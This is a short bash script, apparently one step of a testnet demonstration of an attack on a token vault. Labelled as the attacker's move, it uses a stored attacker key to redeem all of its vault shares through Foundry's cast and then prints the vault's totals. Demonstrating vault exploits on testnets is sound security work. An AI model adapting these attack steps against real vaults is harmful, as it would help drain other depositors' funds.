#!/usr/bin/env bash
# The attacker redeems its shares (all it can, back to its own address).
set -euo pipefail
cd "$(dirname "$0")/../.."
VAULT=0x18375B9E9cDA8Cd25ecbCB69AE94c74f7d02F163
RPC=${RPC_URL:-https://ethereum-sepolia-rpc.publicnode.com}
KEY="$(tr -d ' \n' < .dabao-keys/attacker.key)"
ME=$(cast wallet address --private-key "$KEY")
S=$(cast call $VAULT "balanceOf(address)(uint256)" $ME --rpc-url $RPC)
if [ "$S" != 0 ]; then
    cast send $VAULT "redeem(uint256,address,address)" $S $ME $ME --private-key "$KEY" --rpc-url "$RPC" --json \
        | python3 -c 'import json,sys; r=json.load(sys.stdin); print("  attacker redeems: tx", r["transactionHash"], "status", r["status"])'
fi
echo "vault: $(cast call $VAULT 'totalAssets()(uint256)' --rpc-url $RPC) wei for $(cast call $VAULT 'totalSupply()(uint256)' --rpc-url $RPC) share(s)"
